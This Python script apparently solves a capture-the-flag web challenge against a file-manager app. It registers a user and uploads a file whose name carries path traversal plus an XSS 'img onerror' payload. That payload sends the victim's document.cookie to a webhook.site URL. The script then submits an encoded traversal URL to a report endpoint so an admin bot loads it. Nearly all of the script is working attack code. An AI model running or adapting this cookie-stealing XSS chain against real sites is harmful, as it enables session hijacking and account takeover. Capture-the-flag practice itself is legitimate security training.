import requests
import time 


# BASE_URL = "http://172.18.0.1:5000"
# front_end_url = "http://172.18.0.1:3000"

BASE_URL = "http://172.21.0.2:5000"
front_end_url = "http://172.21.0.3:3000"

# BASE_URL = "http://192.168.49.2:30001"
# front_end_url = "http://192.168.49.2:30002"


BASE_URL = "https://api-filemanager.ctf.clawtheflag.com"
front_end_url = "https://filemanager.ctf.clawtheflag.com"

# BASE_URL = "http://127.0.0.1:5000"
# front_end_url = "http://127.0.0.1:3000"

# User credentials
USER_CREDENTIALS = {
    "username": "testuser1",
    "password": "password123"
}

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
session = requests.Session()

session.proxies = proxies
session.verify = False  # Disable SSL verification for testing purposes
auth_headers = {}  # Store authentication token


def register():
    """Register a new user"""
    response = session.post(f"{BASE_URL}/api/auth/register", json=USER_CREDENTIALS)
    print("Register:", response.text)

def login():
    """Log in the user"""
    global auth_headers
    response = session.post(f"{BASE_URL}/api/auth/login", json=USER_CREDENTIALS)
    
    if response.status_code == 200:
        token = response.json().get("token")
        auth_headers = {"Authorization": f"Bearer {token}"}
        print("Login Successful:", response.json())
    else:
        print("Login Failed:", response.json())

def create_file(content):
    """Create a new file"""
    file_data = {
        'content': content
    }
    response = session.post(f"{BASE_URL}/api/files", json=file_data, headers=auth_headers)
    print("Create File:", response.json())
    return response.json().get("name")

def get_file(filename):
    """Retrieve a specific file"""
    response = session.get(f"{BASE_URL}/api/files/{filename}", headers=auth_headers)
    print("Get File:", response.json())

def get_all_files():
    """Retrieve all files belonging to the logged-in user"""
    response = session.get(f"{BASE_URL}/api/files", headers=auth_headers)
    print("Get All Files:", response.json())

def delete_file(filename):
    """Delete a specific file"""
    response = session.delete(f"{BASE_URL}/api/files/{filename}", headers=auth_headers)
    print("Delete File:", response.json())

if __name__ == "__main__":
    register()
    login()
    import json
    xss_payload = json.dumps({"filename":"../../api/admin_debug?query=<img/src='a'onerror=fetch?.(`https://webhook.site/80e5ce91-d604-463f-b78e-fec919739e25?q=${document.cookie}`)>", "content": "qwer"})
    print(xss_payload)
    print(session.cookies)
    filename = create_file(xss_payload)
    # get_file(filename)
    # get_all_files()
    # delete_file(filename)
    malicious_url = f"{front_end_url}/files/{filename}%2f..%2f..%2fcontent%2f{filename}"
    print("Malicious URL:", malicious_url)


    # http://localhost:3000/files/37431245ebb741a193495d136033b38a%2f..%2fcontent%2f37431245ebb741a193495d136033b38a





    data = {
        'url': malicious_url
    }
    print(session.cookies)
    # time.sleep(2)
    res = session.post(f'{BASE_URL}/api/report', data=data, headers=auth_headers)

    print(res.text)


